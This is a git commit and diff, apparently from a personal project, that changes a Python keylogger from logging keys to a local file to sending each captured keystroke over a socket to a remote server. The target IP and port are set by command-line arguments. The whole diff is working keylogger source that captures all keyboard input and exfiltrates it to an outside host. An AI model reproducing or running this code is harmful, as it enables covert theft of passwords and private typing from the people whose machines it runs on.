b9812a29cdb510220c37325199cc0adab33fc8f4
anthony jaquaniello <anthony.jaquaniello@gmail.com>
2024-07-11 15:57:15 +0200

    send keystrokes by socket

--- keylogger.py
+++ keylogger.py
@@ -1,13 +1,31 @@
+#need elevated privileges
 import keyboard
+import socket
+import argparse
+
+parser = argparse.ArgumentParser(prog="keylogger.py",
+                                 description="keylogger in python, send keystroke to a specified remote server")
+parser.add_argument("-t", "--target", default="127.0.0.1", type=str, required=False, help="target ipv4")
+parser.add_argument("-p", "--port", default=1234, type=int, required=False, help="target port")
+args = parser.parse_args()
+
+#server will listen for incoming connection
+SERVER_IP = args.target
+SERVER_PORT = args.port
+BUFFER_SIZE=1024
+
+#create a socket
+s = socket.socket()
+s.connect((SERVER_IP, SERVER_PORT))
+
 def keylogger(event):
     """
     callback function called each time a key is pressed
     :param event:
     :return:
     """
-    with open("tmp.txt", 'a') as f:
-        f.write(f"{event.name}\n")
 
-#call keylogger everytime a key is pressed
+    s.send(event.name.encode())
+
 keyboard.on_press(keylogger)
 keyboard.wait()
